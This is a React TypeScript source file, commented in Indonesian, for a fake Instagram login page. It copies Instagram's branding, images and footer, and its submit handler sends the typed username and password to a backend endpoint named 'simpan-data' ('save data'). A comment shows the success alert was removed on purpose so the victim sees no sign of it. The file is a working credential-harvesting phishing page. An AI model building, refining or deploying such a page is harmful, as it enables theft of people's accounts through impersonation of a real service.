// src/components/LoginPage.tsx

import React, { useState } from 'react';
import '../styles/LoginPage.css';

// ... (interface ApiResponse tetap sama) ...

const LoginPage: React.FC = () => {
    // ... (useState dan resetForm tetap sama) ...
    const [username, setUsername] = useState<string>('');
    const [password, setPassword] = useState<string>('');

    const resetForm = () => {
        setUsername('');
        setPassword('');
    };

    const handleLogin = (event: React.FormEvent<HTMLFormElement>) => {
        event.preventDefault();
        const dataToSend = { username, password };

        const apiUrl = import.meta.env.VITE_API_URL;
        const backendUrl = `${apiUrl}/api/simpan-data`;

        fetch(backendUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(dataToSend)
        })
        .then(response => {
            if (!response.ok) {
                return response.json().then(errorData => {
                    throw new Error(errorData.message || 'Terjadi kesalahan pada server.');
                });
            }
            return response.json();
        })
        .then((data: ApiResponse) => {
            console.log('Respons dari server:', data.message); // Tetap simpan ini untuk debugging
            resetForm();

            // --- PERUBAHAN UTAMA DI SINI ---
            // Baris alert berikut ini dihapus agar tidak muncul pop-up
            // alert('Login berhasil! Data telah dikirim.'); 
            // --- AKHIR PERUBAHAN ---

        })
        .catch(error => {
            console.error('Terjadi error:', error);
            // Alert untuk error tetap dipertahankan agar pengguna tahu jika ada masalah
            alert(`Gagal: ${error.message}`);
        });
    };
    
    // ... (sisa kode Anda, handlePlaceholderClick dan return(...), tetap sama) ...
    const handlePlaceholderClick = (e: React.MouseEvent<HTMLAnchorElement>) => {
        e.preventDefault();
        alert("Fungsionalitas ini belum diimplementasikan.");
    }

    return (
        <main className="main-container">
            {/* ... semua elemen JSX Anda tetap sama ... */}
            <div className="content-wrapper">
                <div className="login-box">
                    <h1 className="logo">Instagram</h1>
                    <form className="login-form" onSubmit={handleLogin}>
                        <input 
                            type="text" 
                            name="username" 
                            placeholder="Phone number, username, or email" 
                            value={username}
                            onChange={(e) => setUsername(e.target.value)}
                            required 
                        />
                        <input 
                            type="password" 
                            name="password" 
                            placeholder="Password" 
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            required 
                        />
                        <button type="submit" className="btn-login">Log in</button>
                    </form>
                    <div className="separator">OR</div>
                    <a href="/login/facebook" onClick={handlePlaceholderClick} className="facebook-login">
                        <svg aria-label="Facebook icon" className="facebook-icon" fill="#385185" height="16" role="img" viewBox="0 0 448 512" width="16"><path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 38.73V256h68.75l-11 71.69h-57.75V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z"></path></svg>
                        <span>Log in with Facebook</span>
                    </a>
                    <a href="/password/reset" onClick={handlePlaceholderClick} className="forgot-password">Forgot password?</a>
                </div>

                <div className="signup-box">
                    <p>Don't have an account? <a href="/signup" onClick={handlePlaceholderClick}>Sign up</a></p>
                </div>

                <div className="get-app-section">
                    <p>Get the app.</p>
                    <div className="app-stores">
                        <a href="/get-app/google" onClick={handlePlaceholderClick}><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" /></a>
                        <a href="/get-app/microsoft" onClick={handlePlaceholderClick}><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft" /></a>
                    </div>
                </div>
            </div>

            <footer className="footer">
                <div className="footer-nav">
                    <a href="/meta" onClick={handlePlaceholderClick}>Meta</a><a href="/about" onClick={handlePlaceholderClick}>About</a><a href="/blog" onClick={handlePlaceholderClick}>Blog</a><a href="/jobs" onClick={handlePlaceholderClick}>Jobs</a><a href="/help" onClick={handlePlaceholderClick}>Help</a><a href="/api" onClick={handlePlaceholderClick}>API</a><a href="/privacy" onClick={handlePlaceholderClick}>Privacy</a><a href="/terms" onClick={handlePlaceholderClick}>Terms</a><a href="/locations" onClick={handlePlaceholderClick}>Locations</a><a href="/instagram-lite" onClick={handlePlaceholderClick}>Instagram Lite</a><a href="/threads" onClick={handlePlaceholderClick}>Threads</a><a href="/contact" onClick={handlePlaceholderClick}>Contact Uploading & Non-Users</a><a href="/meta-verified" onClick={handlePlaceholderClick}>Meta Verified</a>
                </div>
                <div className="footer-copyright">
                    <span>English</span>
                    <span>© 2025 Instagram from Meta</span>
                </div>
            </footer>
        </main>
    );
};

export default LoginPage;